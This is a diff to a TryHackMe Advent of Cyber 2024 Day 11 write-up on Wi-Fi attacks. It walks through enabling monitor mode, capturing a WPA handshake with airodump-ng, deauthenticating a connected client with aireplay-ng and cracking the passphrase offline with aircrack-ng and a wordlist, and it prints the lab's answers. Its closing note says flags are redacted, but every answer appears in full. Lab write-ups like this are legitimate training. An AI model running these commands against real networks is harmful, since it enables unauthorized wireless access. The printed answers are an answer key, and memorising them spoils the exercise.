@@ -1,52 +1,86 @@
-# Advent of Cyber 2024 - Day 11: Wi-Fi
+# Advent of Cyber 2024 - Day 11: If you'd like to WPA, press the star key!
 
 {% embed url="https://tryhackme.com/room/adventofcyber2024" %}
 
-It's beginning to look a lot like a rogue access point!
+## Overview & Investigation Walkthrough
 
-## Background
+1. What is the BSSID of our wireless interface?
 
-Wireless security requires analyzing 802.11 management frames and authentication handshakes. Threat actors deploy rogue access points ("Evil Twins") spoofing legitimate network SSIDs to trick clients into connecting or disclosing credentials.
+   To find the BSSID of our wireless interface we can use `iw dev`.
 
-The WPA/WPA2 4-way handshake negotiates encryption keys. By capturing this handshake using packet sniffers (`airodump-ng`) and sending deauthentication frames (`aireplay-ng`), attackers can crack the pre-shared key (PSK) offline using wordlist attacks.
+   ![Bssid](https://raw.githubusercontent.com/Kevinovitz/TryHackMe_Writeups/main/adventofcyber2024/Advent_of_Cyber_2024_Day_11_Bssid.png)
 
-## Walkthrough
+   ><details><summary>Click for answer</summary>02:00:00:00:02:00</details>
 
-**Step 1 — Enable Monitor Mode**
+2. What is the SSID and BSSID of the access point? Format: SSID, BSSID
 
-Put the wireless interface into monitor mode:
-```bash
-sudo airmon-ng start wlan0
-```
+   To find the SSID and BSSID of the access point we can use: `sudo iw dev wlan2 scan`.
 
-**Step 2 — Discover Rogue Access Points**
+   ![Ssid](https://raw.githubusercontent.com/Kevinovitz/TryHackMe_Writeups/main/adventofcyber2024/Advent_of_Cyber_2024_Day_11_Ssid.png)
 
-Scan nearby wireless networks:
-```bash
-sudo airodump-ng wlan0mon
-```
-Identified networks:
-- Legit AP: BSSID `02:00:00:00:00:00`
-- Evil Twin AP: BSSID `02:00:00:00:02:00` broadcasting SSID `MalwareM_AP`
-- Connected Client: MAC `02:00:00:00:01:00`
+   ><details><summary>Click for answer</summary>MalwareM_AP, 02:00:00:00:00:00</details>
 
-**Step 3 — Capture Handshake and Crack Passphrase**
+3. What is the BSSID of the wireless interface that is already connected to the access point?
 
-Capture frames on channel 6:
-```bash
-sudo airodump-ng -c 6 --bssid 02:00:00:00:02:00 -w capture wlan0mon
-```
-Crack the captured 4-way handshake:
-```bash
-aircrack-ng capture-01.cap -w /usr/share/wordlists/rockyou.txt
-```
-The passphrase is recovered: `fluffy/champ24`.
+   To get the BSSID of the connected client, we can use `airodump-ng`. We need to have it listen on wlan2.
+
+   We could manually put the access point into monitor mode, but `airodump-ng` can to it automatically.
+
+   ```cmd
+   sudo ip link set dev wlan2 down
+   sudo iw dev wlan2 set type monitor
+   sudo ip link set dev wlan2 up
+   ```
+
+   ```cmd
+   sudo airodump-ng wlan2
+   ```
+
+   AIRODUMP
+
+   After a while, a client should pop-up.
+
+   ><details><summary>Click for answer</summary>02:00:00:00:01:00</details>
+
+4. What is the PSK after performing the WPA cracking attack?
+
+   To start monitoring more specifically we can use:
+
+   ```cmd
+   sudo airodump-ng -c 6 --bssid 02:00:00:00:00:00 -w output-file wlan2
+   ```
+
+   ![Client](https://raw.githubusercontent.com/Kevinovitz/TryHackMe_Writeups/main/adventofcyber2024/Advent_of_Cyber_2024_Day_11_Client.png)
+
+   Next step is to disconnect the client whilst monitoring traffic.
+
+   ```cmd
+   sudo aireplay-ng -0 1 -a 02:00:00:00:00:00 -c 02:00:00:00:01:00 wlan2
+   ```
+
+   ![Disconnect](https://raw.githubusercontent.com/Kevinovitz/TryHackMe_Writeups/main/adventofcyber2024/Advent_of_Cyber_2024_Day_11_Disconnect.png)
+
+   ![Captured](https://raw.githubusercontent.com/Kevinovitz/TryHackMe_Writeups/main/adventofcyber2024/Advent_of_Cyber_2024_Day_11_Captured.png)
+
+   Now we can crack this handshake using `aircrack-ng`.
+
+   ```cmd
+   sudo aircrack-ng -a 2 -b 02:00:00:00:00:00 -w /home/glitch/rockyou.txt output*cap 
+   ```
+
+   ![Password](https://raw.githubusercontent.com/Kevinovitz/TryHackMe_Writeups/main/adventofcyber2024/Advent_of_Cyber_2024_Day_11_Password.png)
+
+   ><details><summary>Click for answer</summary>fluffy/champ24</details>
+
+5. If you enjoyed this task, feel free to check out theNetworkingmodule.
 
 ## 🏁 Questions & Answers
 
 | Question | Answer |
 |---|---|
-| What is the BSSID of the rogue access point? | `02:00:00:00:02:00` |
-| What SSID is broadcast by the rogue AP? | `MalwareM_AP` |
-| What is the MAC address of the connected client? | `02:00:00:00:01:00` |
-| What is the WPA passphrase for the network? | `fluffy/champ24` |
+| What is the BSSID of our wireless interface? | `02:00:00:00:02:00` |
+| What is the SSID and BSSID of the access point? Format: SSID, BSSID | `MalwareM_AP, 02:00:00:00:00:00` |
+| What is the BSSID of the wireless interface that is already connected to the access point? | `02:00:00:00:01:00` |
+| What is the PSK after performing the WPA cracking attack? | `fluffy/champ24` |
+
+> **Note:** Flags are redacted as `flag{hidden}` in accordance with responsible disclosure guidelines. The step-by-step commands above provide the verified reproduction path.
